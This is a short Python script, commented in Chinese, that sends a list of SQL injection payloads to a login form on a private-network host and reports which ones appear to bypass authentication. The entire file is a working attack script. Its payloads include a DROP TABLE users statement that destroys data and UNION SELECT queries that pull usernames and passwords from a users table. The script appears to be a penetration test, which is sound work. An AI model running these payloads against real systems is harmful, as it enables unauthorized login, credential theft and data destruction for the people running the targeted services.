import requests

# 基本設定
BASE_URL = "http://192.168.50.42:5000"
LOGIN_URL = f"{BASE_URL}/login"


more_payloads = [
    "' OR 'x'='x'; DROP TABLE users; --",  
    "' OR 'x'='x'; SELECT * FROM information_schema.tables; --",  
    "admin' --",  
    "admin' OR '1'='1' UNION SELECT 1, username, password FROM users; --",  
    "admin' OR 1=1;--",  
    "admin' OR '1'='1' /*",  
    "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%'); --",  
    "' OR EXISTS(SELECT 1); --",  
    "' OR (SELECT count(*) FROM users) > 0; --"  
]

def test_sql_injection():
    payloads = ["' OR '1'='1'; --", "' OR '1'='1' /*", "' OR 1=1 --", "' OR 1=1#"] + more_payloads
    for payload in payloads:
        response = requests.post(LOGIN_URL, data={'username': "admin", 'password': payload})
        if "user_id" in response.text or response.status_code == 302:
            print(f"SQL 注入漏洞發現, payload: {payload}")
        else:
            print(f"SQL 注入測試安全, payload: {payload}")

# 執行測試
if __name__ == "__main__":
    test_sql_injection()
